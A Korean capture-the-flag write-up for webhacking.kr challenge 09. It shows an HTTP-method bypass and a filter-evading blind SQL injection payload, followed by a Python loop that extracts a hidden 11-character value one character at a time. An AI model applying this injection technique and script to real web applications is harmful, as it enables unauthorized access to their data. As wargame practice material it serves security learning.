================================================================================================================
[webhacking.kr] 09
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12 -> step14;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13 -> step15;
        }
        step0 -> step1[label="?no=1",arrowhead="normal"];
        step3 -> step2[label="Apple",arrowhead="normal"];
        step4 -> step5[label="?no=2",arrowhead="normal"];
        step7 -> step6[label="Banana",arrowhead="normal"];
        step8 -> step9[label="?no=3",arrowhead="normal"];
        step11 -> step10[label="Secret</b><br><br>hint : length = 11<br>column : id,no",arrowhead="normal"];
        step12 -> step13[label="?no=IF((substr(id,%d,1)in(%s)),3,0)",arrowhead="normal"];
    }

|

Source analysis
================================================================================================================

최초 접속 시 다음과 같은 인증 페이지가 뜬다.

.. image:: ../_images/web-09_1.png
    :align: center

해당 인증 페이지시 다른 메소드로 접속해본다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-09/"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    r = requests.put(url, cookies=cookies, verify=False)

    print r.content

정상적으로 페이지가 출력된다.

.. code-block:: html

    <html>
    <head>
    <title>Challenge 9</title>
    </head>
    <body>
    <a href=?no=1>1</a>&nbsp;<a href=?no=2>2</a>&nbsp;<a href=?no=3>3</a>&nbsp;<form method=get action=index.php>
    Password : <input type=text size=10 maxlength=11 name=pw><input type=submit>
    </form>
    </body>
    </html>

3개의 페이지가 href 되어 있는데 어떤 내용이 있는지 확인해본다.

?no=1일 경우 페이지

.. code-block:: html

    <html>
    <head>
    <title>Challenge 9</title>
    </head>
    <body>
    Apple<form method=get action=index.php>
    Password : <input type=text size=10 maxlength=11 name=pw><input type=submit>
    </form>
    </body>
    </html>

?no=2일 경우 페이지

.. code-block:: html

    <html>
    <head>
    <title>Challenge 9</title>
    </head>
    <body>
    Banana<form method=get action=index.php>
    Password : <input type=text size=10 maxlength=11 name=pw><input type=submit>
    </form>
    </body>
    </html>

?no=3일 경우 페이지

.. code-block:: html

    <html>
    <head>
    <title>Challenge 9</title>
    </head>
    <body>
    <b>Secret</b><br><br>hint : length = 11<br>column : id,no

마지막 페이지를 보니 길이가 11이라는 힌트가 존재하고 컬럼명이 id와 no라고 되어 있다.

|

Blind SQL Injection
================================================================================================================

해당 문제의 페이지는 no를 통해 페이지가 리다이렉트되기 때문에, 다음과 같은 쿼리문으로 이루어져 있을 것이다.

.. code-block:: sql

    SELECT ? FROM ? WHERE no=?

그렇다면 if문을 이용하여 참이 되면 2페이지를, 거짓이 되면 3페이지를 출력하도록 true/false를 지정해준다.
또한, id 컬럼이 같은 테이블에 있다고 가정하여 쿼리문을 입력해보자.


.. code-block:: sql

    SELECT ? FROM ? WHERE no=if((substring(id,1,1)in('a')),2,3)

Access Denied가 나는 것을 보니 필터링이 걸려있다.

.. code-block:: sql

    SELECT ? FROM ? WHERE no=IF((substr(id,1,1)in('a')),3,0)

if문을 대문자로 바꾸고 substring을 substr으로 바꾼 후 다시 쿼리문을 전송한 결과 오류 페이지는 출력되지 않았으나, 정상적인 페이지 리턴이 되지 않았다.

single quote가 정상적으로 출력되기 위해서는 'a'값을 hex형식으로 입력하여야한다.

.. code-block:: python

    import requests

    pw =""
    for i in range(1,12):
        for j in range(33,126):
            cookie = {
                "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6",
            }
            url = "http://webhacking.kr/challenge/web/web-09/?no=IF((substr(id,%d,1)in(%s)),3,0)" % (i,str(hex(j)))
            r = requests.put(url, cookies=cookie, verify=False)
            q = r.content
            if "Secret" in q:
                pw += chr(j)
                print pw
                break

    print pw

